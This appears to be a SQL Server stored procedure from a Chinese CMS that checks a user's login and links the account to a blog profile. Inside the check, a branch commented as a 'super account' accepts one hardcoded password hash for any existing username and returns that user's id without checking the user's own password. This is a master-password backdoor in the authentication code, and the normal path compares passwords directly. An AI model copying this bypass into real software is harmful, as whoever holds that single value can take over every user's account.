USE [KWebCMS]
GO
/****** Object:  StoredProcedure [dbo].[kmp_t_user_IEXTSIS]    Script Date: 2014/11/24 23:13:54 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
-- =============================================
-- Author:		liaoxin
-- Create date: 2010-12-16
-- Description:	判断用户权限
-- =============================================
CREATE PROCEDURE [dbo].[kmp_t_user_IEXTSIS]
@username varchar(50),
@pwd varchar(50)
AS
BEGIN
	 DECLARE @userid int,@existsaccount int,@returnvalue int
	declare @account varchar(50)
	set @account=@username
   SELECT @existsaccount=COUNT(1) FROM basicdata..[user] where account=@account and deletetag=1
   
   IF(@existsaccount>0)
   BEGIN
			declare @usertype int
            DECLARE @bloguserid int
            declare @nickname nvarchar(50)
   --超级帐号
	IF(@pwd='B5EB6CE0935E1564D853EE8B467AA356DBA3E516')
     BEGIN
     SELECT @userid=userid FROM basicdata..[user] where account=@account  AND  deletetag=1
     IF(@userid>0)
     BEGIN
			SET @returnvalue=@userid			

			IF NOT EXISTS(SELECT * FROM  basicdata..user_bloguser WHERE userid=@userid)
            BEGIN 

            select @usertype=t1.usertype,@nickname=t1.name 
            from [user] t1 where t1.userid=@userid

             --绑定博客用户
	         INSERT INTO basicdata..user_bloguser(userid) values(@userid)
	         set @bloguserid=@@identity
              EXEC  blogapp..blog_Register @bloguserid ,@usertype,'男',@nickname
			END
     END
     END
   ELSE
    BEGIN
     SELECT @userid=userid From basicdata..[user] WHERE account=@account and [password]=@pwd AND deletetag=1

     IF(@userid>0)
     BEGIN
			SET @returnvalue=@userid

            update basicdata..[user] set lastlogindatetime=getdate() where userid=@userid
			IF NOT EXISTS(SELECT * FROM  basicdata..user_bloguser WHERE userid=@userid)
            BEGIN 
			
            select @usertype=t1.usertype,@nickname=t1.name 
            from [user] t1 
            where t1.userid=@userid

             --绑定博客用户
	         INSERT INTO basicdata..user_bloguser(userid) values(@userid)
	         set @bloguserid=@@identity
              EXEC  blogapp..blog_Register @bloguserid ,@usertype,'男',@nickname
			END
     END
     ELSE
     --密码错误
     BEGIN
     set @returnvalue=-1
     END
    
    END
   END
   
   ELSE
   --用户名不存在
   BEGIN
    set @returnvalue=-2
   END
   if(@returnvalue>0)
	begin
	RETURN 1
	end
	else
	begin
	return @returnvalue
	end
  
END

GO
